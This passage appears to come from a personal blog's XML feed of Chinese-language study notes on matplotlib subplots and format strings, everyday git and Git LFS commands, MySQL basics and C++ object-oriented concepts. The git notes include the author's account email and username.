class="headerlink" title="子图"></a>子图</h2><p>如果需要将多张子图展示在一起，可以使用 subplot() 实现。即在调用 plot()函数之前需要先调用 subplot() 函数。</p><p>该函数的第一个参数代表子图的总行数，</p><p>第二个参数代表子图的总列数，</p><p>第三个参数代表活跃区域。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ax1 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">plt.plot(x,np.sin(x), <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax2 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, sharey=ax1) <span class="comment"># 与 ax1 共享y轴</span></span><br><span class="line">plt.plot(x, np.cos(x), <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax3 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">plt.plot(x,x, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax4 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, sharey=ax3) <span class="comment"># 与 ax3 共享y轴</span></span><br><span class="line">plt.plot(x, <span class="number">2</span>*x, <span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318122150290.png" alt="image-20230318122150290"></p><p>同样的，这些图像支持各自传入各种各样的参数。</p><h2 id="plot的参数"><a href="#plot的参数" class="headerlink" title="plot的参数"></a>plot的参数</h2><p>plot函数支持传入各种参数，不需要在外部再手动设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单条线：</span></span><br><span class="line">plot([x], y, [fmt], data=<span class="literal">None</span>, **kwargs)</span><br><span class="line"><span class="comment">#多条线一起画</span></span><br><span class="line">plot([x], y, [fmt], [x2], y2, [fmt2], ..., **kwargs)</span><br></pre></td></tr></table></figure><p>可选参数[fmt] 是一个字符串来定义图的基本属性如：颜色（color），点型（marker），线型（linestyle），</p><p>具体形式  fmt &#x3D; ‘[color] [ marker ] [ line ]’</p><p>fmt接收的是每个属性的单个字母缩写。</p><pre><code>=============    ===============================character        color=============    ===============================``&#39;b&#39;``          blue 蓝``&#39;g&#39;``          green 绿``&#39;r&#39;``          red 红``&#39;c&#39;``          cyan 蓝绿``&#39;m&#39;``          magenta 洋红``&#39;y&#39;``          yellow 黄``&#39;k&#39;``          black 黑``&#39;w&#39;``          white 白=============    ===============================</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">=============    ===============================</span><br><span class="line">    character        description</span><br><span class="line">    =============    ===============================</span><br><span class="line">    ``&#x27;.&#x27;``          point marker</span><br><span class="line">    ``&#x27;,&#x27;``          pixel marker</span><br><span class="line">    ``&#x27;o&#x27;``          circle marker</span><br><span class="line">    ``&#x27;v&#x27;``          triangle_down marker</span><br><span class="line">    ``&#x27;^&#x27;``          triangle_up marker</span><br><span class="line">    ``&#x27;&lt;&#x27;``          triangle_left marker</span><br><span class="line">    ``&#x27;&gt;&#x27;``          triangle_right marker</span><br><span class="line">    ``&#x27;1&#x27;``          tri_down marker</span><br><span class="line">    ``&#x27;2&#x27;``          tri_up marker</span><br><span class="line">    ``&#x27;3&#x27;``          tri_left marker</span><br><span class="line">    ``&#x27;4&#x27;``          tri_right marker</span><br><span class="line">    ``&#x27;s&#x27;``          square marker</span><br><span class="line">    ``&#x27;p&#x27;``          pentagon marker</span><br><span class="line">    ``&#x27;*&#x27;``          star marker</span><br><span class="line">    ``&#x27;h&#x27;``          hexagon1 marker</span><br><span class="line">    ``&#x27;H&#x27;``          hexagon2 marker</span><br><span class="line">    ``&#x27;+&#x27;``          plus marker</span><br><span class="line">    ``&#x27;x&#x27;``          x marker</span><br><span class="line">    ``&#x27;D&#x27;``          diamond marker</span><br><span class="line">    ``&#x27;d&#x27;``          thin_diamond marker</span><br><span class="line">    ``&#x27;|&#x27;``          vline marker</span><br><span class="line">    ``&#x27;_&#x27;``          hline marker</span><br><span class="line">    =============    ===============================</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=============    ===============================</span><br><span class="line">character        description</span><br><span class="line">=============    ===============================</span><br><span class="line">``&#x27;-&#x27;``          solid line style 实线</span><br><span class="line">``&#x27;--&#x27;``         dashed line style 虚线</span><br><span class="line">``&#x27;-.&#x27;``         dash-dot line style 点画线</span><br><span class="line">``&#x27;:&#x27;``          dotted line style 点线</span><br><span class="line">=============    ===============================</span><br></pre></td></tr></table></figure><p>另外，支持color&#x3D;，linestyle&#x3D;，label&#x3D;关键字传参，具体可参照官方文档，或参考上方plt.xxx设置。一般都有对应的参数。</p><h2 id="各种其他图"><a href="#各种其他图" class="headerlink" title="各种其他图"></a>各种其他图</h2><p>参考绘图类型节即可。这里以柱状图为例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">10</span>)</span><br><span class="line">y = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,<span class="number">10</span>)</span><br><span class="line">plt.bar(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/2023/03/27/git/"/>
      <url>/2023/03/27/git/</url>
      
        <content type="html"><![CDATA[<h1 id="git远程仓库"><a href="#git远程仓库" class="headerlink" title="git远程仓库"></a>git远程仓库</h1><p>网址：<a href="https://github.com/">https://github.com</a></p><p>张朝阳账户：<a href="mailto:&#x7a;&#104;&#97;&#110;&#x67;&#x7a;&#104;&#x61;&#111;&#x79;&#x61;&#110;&#x67;&#64;&#x63;&#x68;&#x64;&#46;&#x65;&#100;&#x75;&#46;&#99;&#110;">&#x7a;&#104;&#97;&#110;&#x67;&#x7a;&#104;&#x61;&#111;&#x79;&#x61;&#110;&#x67;&#64;&#x63;&#x68;&#x64;&#46;&#x65;&#100;&#x75;&#46;&#99;&#110;</a>   用户名zhzj0218，密码：一般密码</p><p>以将&#x2F;d&#x2F;gitproject&#x2F;pycharm_python_and_pyqt中的文件同步到git中的zhzj0218下的pycharm_python_and_pyqt为例</p><p>[TOC]</p><h2 id="查看分支状态"><a href="#查看分支状态" class="headerlink" title="查看分支状态"></a>查看分支状态</h2><p>git status</p><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>git init 把当前的目录变成Git管理的版本库</p><p>git status 查看当前分支状态</p><p>git add . 把当前文件夹下的文件提交到暂存区</p><p>紧接着git commit -m “提交标签，如first proposed” 把暂存区提交到版本库</p><p>执行git status查看状态，确保工作区是干净的，没有需要提交的内容</p><p>（git log查看提交日志，git reflog查看提交版本号）</p><h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><p>git remote -v查看远程版本库信息</p><p>创建github上的git仓库，例如在github的zhzj0218下创建了仓库pycharm_python_and_pyqt.git</p><p>git remote add origin <a href="https://github.com/zhzj0218/pycharm_python_and_pyqt.git">https://github.com/zhzj0218/pycharm_python_and_pyqt.git</a></p><p>将本地仓库关联到Github仓库</p><p>再次查看git remote -v，确认远程仓库关联成功</p><p>git push -u origin master 将本地仓库的内容推送到Github仓库</p><h2 id="远程库克隆到本地"><a href="#远程库克隆到本地" class="headerlink" title="远程库克隆到本地"></a>远程库克隆到本地</h2><p>git clone <a href="https://github.com/zhzj0218/pycharm_python_and_pyqt.git">https://github.com/zhzj0218/pycharm_python_and_pyqt.git</a></p><p>将远程仓库的内容克隆到本地</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="创建版本库-1"><a href="#创建版本库-1" class="headerlink" title="创建版本库"></a>创建版本库</h3><p>git clone <url> 克隆远程版本库到本地</url></p><p>git init 初始化本地版本库</p><h3 id="修改和提交"><a href="#修改和提交" class="headerlink" title="修改和提交"></a>修改和提交</h3><p>git status 查看状态，也可查看冲突的文件</p><p>git dif 查看变更内容</p><p>git add . 跟踪所有改动过的内容</p><p>git add <file> 跟踪制定的文件</file></p><p>git mv <old> <new> 文件改名</new></old></p><p>git rm <file> 删除文件</file></p><p>git rm –cached <file> 停止跟踪文件但不删除</file></p><p>git commit -m “commit message” 提交所有更新过的文件</p><p>git commit –amend 修改最后一次提交</p><h3 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h3><p>git log 查看提交历史</p><p>git log -p <file> 查看指定文件的提交历史</file></p><p>git blame <file> 以列表方式查看指定文件的提交历史</file></p><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><p>git reset –hard HEAD 撤销工作目录中所有未提交文件的修改内容</p><p>git checkout HEAD <file> 撤销指定的未提交文件的修改内容</file></p><p>git revert <commit> 撤销指定的提交</commit></p><p>git reset –hard HEAD^ 还原到上一个版本</p><p>git reset –hard 18b6a 回到之前版本，此处18b6a为某个版本号，版本号无需写全</p><p>（git log查看提交历史，可看到版本号，git log –pretty&#x3D;oneline可简化输出查看版本号，HEAD^表示上一次版本，HEAD^^表示上上一个版本，也可以用数字表示，HEAD~2，也可以用git reflog查看版本号，此时的版本号较短，为简短版本号）</p><p>git checkout – <file> 文件没有添加到暂存区时，撤回工作区的修改</file></p><p>git reset HEAD <file> 文件已经添加到暂存区时，撤销暂存区的修改，然后再使用git check – <file> 撤回工作区的修改</file></file></p><h3 id="分支与标签"><a href="#分支与标签" class="headerlink" title="分支与标签"></a>分支与标签</h3><p>git branch 显示所有本地分支</p><p>git checkout &lt;branch&#x2F;tag&gt; 切换到指定分支或者标签</p><p>git branch <new-branch> 创建新分支</new-branch></p><p>git branch -d <branch> 删除本地分支</branch></p><p>git tag 列出所有本地标签</p><p>git tag <tagname>基于最新提交创建标签</tagname></p><p>git tag -d <tagname> 删除标签</tagname></p><h3 id="合并与衍合"><a href="#合并与衍合" class="headerlink" title="合并与衍合"></a>合并与衍合</h3><p>git merge <branch> 合并指定分支到当前分支</branch></p><p>git rebase <branch> 衍合指定分支到当前分支</branch></p><h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>git remote -v 查看远程版本库信息</p><p>git remote show <remote> 查看指定远程版本库信息</remote></p><p>git remote add <remote> <url> 添加远程版本库</url></remote></p><p>git fetch <remote> 从远程库获取代码</remote></p><p>git pull <remote> <branch> 下载代码及快速合并</branch></remote></p><p>git push <remote> <branch> 上传代码及快速合并</branch></remote></p><p>git push <remote>  :&lt;branch&#x2F;tag-name&gt; 删除远程分支或标签</remote></p><p>git push –tags 上传所有标签</p><p>git remote rm origin移除原先错误的origin remote</p><h3 id="查看和修改用户名和邮箱"><a href="#查看和修改用户名和邮箱" class="headerlink" title="查看和修改用户名和邮箱"></a>查看和修改用户名和邮箱</h3><p>git config user.name查看用户名</p><p>git config user.email查看邮箱</p><p>git config –global user.name “your name”修改用户名为your name</p><p>git config –global user.email “your email”修改用户名为your email</p><h3 id="密码输入错误的解决方法"><a href="#密码输入错误的解决方法" class="headerlink" title="密码输入错误的解决方法"></a>密码输入错误的解决方法</h3><p>在控制面板，管理windows凭证，修改正确的密码</p><h3 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h3><p>git默认不能上传超过100M的文件，如果上传100M的文件，则会出现fatal: The remote end hung up unexpectedly的错误，表示存在大文件不能上传。因此需要处理大文件的上传。</p><p>示例：假设当前存在后缀为.exe，.zip及.whl的大文件，处理步骤如下：</p><p>git lfs install 安装lfs</p><p>git lfs track “*.zip”</p><p>git lfs track “*.exe”</p><p>git lfs track “*.whl”</p><p>则文件夹中生成的.gitattributes文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*.exe filter=lfs diff=lfs merge=lfs -text</span><br><span class="line">*.zip filter=lfs diff=lfs merge=lfs -text</span><br><span class="line">*.whl filter=lfs diff=lfs merge=lfs -text</span><br></pre></td></tr></table></figure><p>git add .gitattributes 将.gitattributes文件加入到暂存区</p><p>git commit -m “add lfs file” 提交文件</p><p>git push origin master 将本地仓库内容提交到Github仓库（包含大文件提交，提交的大文件具有lfs标签，表明为大文件）</p>]]></content>
      
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2023/03/27/MySQL/"/>
      <url>/2023/03/27/MySQL/</url>
      
        <content type="html"><![CDATA[<ol><li><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2></li></ol><p>到官网进行安装。点击MySQL Installer for Windows下载安装包后一直next即可。</p><ol start="2"><li><h2 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h2></li></ol><p>mysql开机默认启动。</p><p>在win+R运行services.msc，找到mysql右键操作。</p><p>在cmd中运行net start mysql80、net stop mysql80进行启动与停止。</p><ol start="3"><li><h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2></li></ol><p>方式一：直接使用mysql提供的命令行进行连接。开始找到MySQL Command Line Client-Unicode，进去输入密码操作。</p><p>方式二：先配置PATH环境变量C:\Program Files\MySQL\MySQL Server 8.0\bin。在任意cmd输入mysql -u root -p，输入密码操作。</p><ol start="4"><li><h2 id="MySQL数据库的好处"><a href="#MySQL数据库的好处" class="headerlink" title="MySQL数据库的好处"></a>MySQL数据库的好处</h2></li></ol><p>关系型数据库RDBMS，建立在关系模型基础上，由多张相互连接的二维表组成的数据库。格式统一，便于维护，使用SQL语言操作，使用方便。数据模型是数据库，可以创建多个表。</p><ol start="5"><li><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2></li></ol><p>  （1） SQL通用语法</p><p>  <img src="/.io//image-20220608212631284.png" alt="image-20220608212631284"></p><p>  （2） SQL分类</p><p>  <img src="/.io//image-20220608231123489.png" alt="image-20220608231123489"></p><p>  （3） DDL</p><p>  ​查询数据库</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">select</span> database();# 查询当前数据库</span><br></pre></td></tr></table></figure><p>  ​如果创建了同样名称的数据库会报错。一般使用以下指令创建。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span>;</span><br></pre></td></tr></table></figure><p>  ​在创建数据库的时候可以指定字符集。utf8只占有三个字节，而某些数据会占据四个字节，因此一般设置为utf8mb4</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">default</span> charset utf8mb4;</span><br></pre></td></tr></table></figure><p>  ​删除数据库 删除不存在的数据库同样会报错，因此使用以下指令进行删除</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> database IF <span class="keyword">EXISTS</span> databaseName;</span><br></pre></td></tr></table></figure><p>  ​数据库使用</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE databaseName;</span><br></pre></td></tr></table></figure><p>  ​表创建</p><ul><li>数据类型quality</li></ul><p>  ​1）数值类型</p><p>  <img src="/.io//image-20220609124851766.png" alt="image-20220609124851766"></p><p>  ​定义float和double类型时，需要两个参数。如score double(4, 1)代表4个长度，最多1位小数。</p><p>  ​定义无符号时应该是 age TINYINT UNSIGNED;,unsigned放在数据类型后面。</p><p>  ​2） 字符串类型</p><p>  <img src="/.io//image-20220609125257798.png" alt="image-20220609125257798"></p><p>  ​sql中字符串为varchar(size)，size是字符串的长度。一旦超出size会报错。varchar会动态占用内存，而char不管多大都必定占用size内存。但是char性能更高。</p><p>  ​例如用户名适合用varchar，性别适合用char。</p><p>  ​3） 日期类型</p><p>  <img src="/.io//image-20220609125639480.png" alt="image-20220609125639480"></p><p>  birthday date;</p><p>  注意最后一个字段没有逗号。 </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tableName(</span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 COMMENT “字段<span class="number">1</span>注释”,</span><br><span class="line">    ...</span><br><span class="line">    字段n 字段n类型 COMMENT “字段n注释”</span><br><span class="line">)COMMENT “表注释”；</span><br></pre></td></tr></table></figure><p>  ​查询当前数据库所有表，需要先用use指令进入数据库。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure><p>  ​查询表结构</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESC</span> databaseName;</span><br></pre></td></tr></table></figure><p>  ​查询指定表的建表语句，用于展示详细注释</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> databaseName;</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><p>  <img src="/.io//image-20220609130454987.png" alt="image-20220609130454987"></p><p>  ​表修改</p><p>  1）添加字段</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> fieldName quality COMMENT “注释” 约束;</span><br></pre></td></tr></table></figure><p>  <img src="/.io//image-20220612192330899.png" alt="image-20220612192330899"></p><p>​2） 修改数据类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName MDOIFY fieldName newQuality(size);</span><br></pre></td></tr></table></figure><p>​3） 修改字段名和字段类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName CHANGE oldTableName newTableName quality(size) COMMENT &quot;注释&quot; 约束;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220613164607169.png" alt="image-20220613164607169"></p><p>​4)删除字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">DROP</span> filedName;</span><br></pre></td></tr></table></figure><p>​5)修改表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName RENAME <span class="keyword">TO</span> newTableName;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220613164847531.png" alt="image-20220613164847531"></p><p>​6)删除表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> tableName;</span><br></pre></td></tr></table></figure><p>​7)删除指定表，并重新创建空的表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> tableName;</span><br></pre></td></tr></table></figure><ol start="6"><li>图形化工具DataGrip</li></ol><p>进入后点击左上角加号，新增mysql Data Sources ,配置文件。user填root，密码随便设置，确认后下载驱动文件。</p><p>​1） 创建数据库</p><p>右键 new 选择schema，填写名字。</p><pre><code> 2）新建表</code></pre><p>右键数据库 创建表，填写名字和注释信息。在colums中创建字段。点击execute。</p><p>​3）修改表</p><p>右键数据库 modify table</p><p>​4）使用sql语句操作 </p><p>右键 new quary console</p><p>​（4）DML 增删改操作</p><p><img src="/.io//image-20220618161047205.png" alt="image-20220618161047205"></p><p><img src="/.io//image-20220618161121394.png" alt="image-20220618161121394"></p><p><img src="/.io//image-20220618161328719.png" alt="image-20220618161328719"></p><p>如果没有where条件，会修改所有数据。</p><p><img src="/.io//image-20220618161853602.png" alt="image-20220618161853602"></p><p>（5）DQL 查操作 关键字：SELECT</p><p> 1）基础查询</p><p><img src="/.io//image-20220618162123361.png" alt="image-20220618162123361"></p><p>查询可以起别名。SELECT … as ‘ ,,, ‘ from …;其中as可以省略。</p><p>查询如果不要重复，可以在select后加distinct关键字。</p><p><img src="/.io//image-20220618163140955.png" alt="image-20220618163140955"></p><p><img src="/.io//image-20220618163247041.png" alt="image-20220618163247041"></p><p><img src="/.io//image-20220618163307080.png" alt="image-20220618163307080"></p><ul><li>聚合函数</li></ul><p><img src="/.io//image-20220618163412171.png" alt="image-20220618163412171"></p><p>count不会统计null，最好采用count(*)</p><p>2） 分组查询</p><p><img src="/.io//image-20220618163708910.png" alt="image-20220618163708910"></p><p><img src="/.io//image-20220618163846266.png" alt="image-20220618163846266"></p><p><img src="/.io//image-20220618163948066.png" alt="image-20220618163948066"></p><p>3） 排序查询</p><p><img src="/.io//image-20220618164045538.png" alt="image-20220618164045538"></p><p>如果是多字段排序，字段一 一样时才会用第二种排序</p><p>4） 分页查询</p><p><img src="/.io//image-20220618164338732.png" alt="image-20220618164338732"></p><ul><li>编写顺序与执行顺序</li></ul><p><img src="/.io//image-20220618164904815.png" alt="image-20220618164904815"></p><p>（6）DCL 管理数据库用户、控制数据库访问权限</p><p>1） 用户</p><p><img src="/.io//image-20220618165210119.png" alt="image-20220618165210119"></p><p><img src="/.io//image-20220618165444310.png" alt="image-20220618165444310"></p><p>2） 权限</p><p><img src="/.io//image-20220618165522969.png" alt="image-20220618165522969"></p><p><img src="/.io//image-20220618165546535.png" alt="image-20220618165546535"></p><p>主机名可以用’%’通配，表名用’*’通配。</p><ol start="7"><li>函数 mysql内置了函数。select 函数名();</li></ol><p>（1）字符串函数</p><p><img src="/.io//image-20220618165858267.png" alt="image-20220618165858267"></p><p>（2）数值函数</p><p><img src="/.io//image-20220618170006506.png" alt="image-20220618170006506"></p><p>（3）日期函数</p><p><img src="/.io//image-20220618170109965.png" alt="image-20220618170109965"></p><p>type填写YEAR、MONTH、DAY</p><p>（4）流程函数</p><p><img src="/.io//image-20220618170305620.png" alt="image-20220618170305620"></p><p><img src="/.io//image-20220618170413188.png" alt="image-20220618170413188"></p><ol start="8"><li>约束 保证数据的正确性和完整性</li></ol><p><img src="/.io//image-20220618170648105.png" alt="image-20220618170648105"></p><p><img src="/.io//image-20220618170843417.png" alt="image-20220618170843417"></p><p><img src="/.io//image-20220618171037126.png" alt="image-20220618171037126"></p><p>尽管没有插入成功，数据也会向mysql申请主键。</p><p>在可视化创建数据的时候可以直接勾选。</p><ul><li>外键关联 表之间的联系</li></ul><p><img src="/.io//image-20220618171436873.png" alt="image-20220618171436873"></p><p><img src="/.io//image-20220618171631373.png" alt="image-20220618171631373"></p><p><img src="/.io//image-20220618171705691.png" alt="image-20220618171705691"></p><p><img src="/.io//image-20220618171815398.png" alt="image-20220618171815398"></p><ol start="9"><li><p>事务 要么全部成功，要么全部失败</p><p> 方式一</p></li></ol><p><img src="/.io//image-20220618172507776.png" alt="image-20220618172507776"></p><p>​方式二</p><p><img src="/.io//image-20220618172801474.png" alt="image-20220618172801474"></p><ul><li>事务的四大特性</li></ul><p><img src="/.io//image-20220618172956835.png" alt="image-20220618172956835"></p><ul><li>并发事务问题</li></ul><p><img src="/.io//image-20220618173159379.png" alt="image-20220618173159379"></p><p>解决方法：事务的隔离级别</p><p><img src="/.io//image-20220618173605287.png" alt="image-20220618173605287"></p><h2 id="python-3中运行pip-install-Mysqlclient-通过import-MySQLdb来建立数据库的连接。"><a href="#python-3中运行pip-install-Mysqlclient-通过import-MySQLdb来建立数据库的连接。" class="headerlink" title="python 3中运行pip install Mysqlclient, 通过import MySQLdb来建立数据库的连接。"></a>python 3中运行pip install Mysqlclient, 通过import MySQLdb来建立数据库的连接。</h2>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向对象</title>
      <link href="/2023/03/22/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2023/03/22/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><p>关键字，作为返回值时加上不调用拷贝构造函数。作为类关键字防止被拷贝。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>父类指针指向子类对象</p><p>父类提供virtual 虚函数，子类对象实现</p><p>析构函数加virtual，可以调用子类的析构函数</p><p>构造函数前不能加virtual，因为构造函数执行后，虚表才出现</p><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p><img src="/.io//image-20230315211914313.png" alt="image-20230315211914313"></p><p>类中，++i比i++效率高，因为后者还要调用构造函数</p><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>用父类指针作为返回值，在返回值创建子类对象</p><p><img src="/.io//image-20230315201712599.png" alt="image-20230315201712599"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="单体模式"><a href="#单体模式" class="headerlink" title="单体模式"></a>单体模式</h2><h2 id="sizeof、-countof"><a href="#sizeof、-countof" class="headerlink" title="sizeof、_countof"></a>sizeof、_countof</h2><p>_tscanf_s( _T(“%d”), v1, _countof(v1));</p><p><img src="/.io//image-20230315203513264.png" alt="image-20230315203513264"></p><p>sizeof 数据类型大小与数据大小相乘，实际的数据大小</p><p>countof 数据大小，实际上的数据数量</p><h2 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h2><p>大小为4，1，8，按最大的对齐</p><p><img src="/.io//image-20230315204035697.png" alt="image-20230315204035697"></p><p>如上，实际上为16。double占8，另外两个加起来用8</p><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>函数名一样，参数类型不同，参数数量不同</p><p>与返回值类型<strong>无关</strong></p><p>使用const，<strong>发生</strong>重载。</p><p><img src="/.io//image-20230315204445450.png" alt="image-20230315204445450"></p><p>const是常对象调用的。</p><h2 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h2><p>一个派生类D是由多继承产生的，它的多个基类B、C继承了同一个基类A。造成派生类D中具有多份A类的属性，属于一种不合理的现象</p><p><img src="/.io//20190118194303573.png" alt="img"></p><p>会让高层的基类在底层的派生类中拥有多份成员，造成二义性。</p><p>解决方法：使用作用域、利用虚继承</p><p>在使用时加上作用域</p><p><img src="/.io//image-20230319195155868.png" alt="image-20230319195155868"></p><p>但是不能解决多次拷贝的问题</p><h2 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h2><p><img src="/.io//image-20230319195311020.png" alt="image-20230319195311020"></p><p>给所有函数都加上virtual 继承时使用虚继承</p><p><img src="/.io//image-20230319195704646.png" alt="image-20230319195704646"></p><p>使用虚继承时，第一成员是一个指针，指向一个结构体，里面第二成员是一个十六进制偏移。偏移值是父类到子类的偏移。</p><p>虚继承中，父类指针只能访问子类对象被继承的部分。因为在定义的时候，有一个偏移指向对应的数据。</p><p><img src="/.io//image-20230319200336941.png" alt="image-20230319200336941"></p><h2 id="虚表"><a href="#虚表" class="headerlink" 